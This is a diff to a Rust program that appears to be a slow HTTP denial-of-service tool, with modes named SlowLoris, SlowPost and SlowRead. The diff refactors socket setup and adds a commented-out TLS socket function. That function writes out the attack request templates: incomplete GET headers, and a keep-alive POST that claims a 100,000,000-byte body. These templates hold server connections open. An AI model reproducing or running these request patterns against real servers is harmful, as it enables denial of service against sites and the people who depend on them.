@@ -4,7 +4,7 @@ extern crate pretty_env_logger;
 use std::error::Error;
 use rayon::prelude::*;
 // use openssl::ssl::{SslStream, SslMethod, SslConnector};
-use std::net::{Ipv4Addr, SocketAddr, TcpStream};
+use std::net::TcpStream;
 use std::{thread, time};
 use std::io::{Read, Write};
 use rand::prelude::*;
@@ -123,6 +123,11 @@ impl Lori<TcpStream> {
 
             let max = self.connections.len() - 1;
 
+            // self.connections = self.connections.into_par_iter().filter(|i| {
+
+            //     true
+            // }).collect();
+
             for i in 0..max{
                 // prevent out of bounds error
                 if i >= self.connections.len() {
@@ -210,7 +215,7 @@ fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
     let ua: &'static str;
 
     if config.rand_ua {
-        ua = rng.choose(USER_AGENTS).unwrap();
+        ua = USER_AGENTS.choose(&mut rng).unwrap();
     }
     else {
         ua = USER_AGENTS[0];
@@ -226,35 +231,56 @@ fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
     };
 
 
-    // Use https
-    // if config.https {
-    //     // Create SSL Connector
-    //     let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
-
-    //     let url = String::new();
-
-    //     url.push_str(&config.addr);
-    //     url.push_str(&":");
-    //     url.push_str(&config.port.to_string());
-
-    //     let ssl_stream = connector.connect(&url, stream)?;
-
-    //     trace!("Headers:\n{}", headers);
-
-    //     // Send HTTP(S) request
-    //     ssl_stream.write_all(headers.as_bytes())?;
-
-
-    //     // Ok(ssl_stream)
-    // }
-    // else {
     trace!("Headers:\n{}", headers);
 
-    // Send HTTP(S) request
     stream.write_all(headers.as_bytes())?;
 
     Ok(stream)
-        // }
-
 
 }
+
+// Create a socket with SSL
+// fn init_socket_ssl(config: &Config) -> Result<SslStream<TcpStream>, Box<dyn Error>>{
+//     // Create stream as normal
+//     let mut stream = TcpStream::connect((&config.addr[..], config.port))?;
+
+//     let mut rng = rand::thread_rng();
+
+//     let ua: &'static str;
+
+//     if config.rand_ua {
+//         ua = USER_AGENTS.choose(&mut rng).unwrap();
+//     }
+//     else {
+//         ua = USER_AGENTS[0];
+//     }
+
+//     let y: u16 = rng.gen();
+
+//     let headers: String = match config.dos_type {
+//         // DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
+//         DOSType::SlowPost => format!("POST / HTTP/1.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 100000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n", ua),
+//         DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
+//         DOSType::SlowRead => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\n\r\n", y, ua),
+//     };
+
+
+//         // Create SSL Connector
+//         let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
+
+//         let url = String::new();
+
+//         url.push_str(&config.addr);
+//         url.push_str(&":");
+//         url.push_str(&config.port.to_string());
+
+//         let ssl_stream = connector.connect(&url, stream)?;
+
+//         trace!("Headers:\n{}", headers);
+
+//         // Send HTTP(S) request
+//         ssl_stream.write_all(headers.as_bytes())?;
+
+
+//         Ok(ssl_stream)
+// }
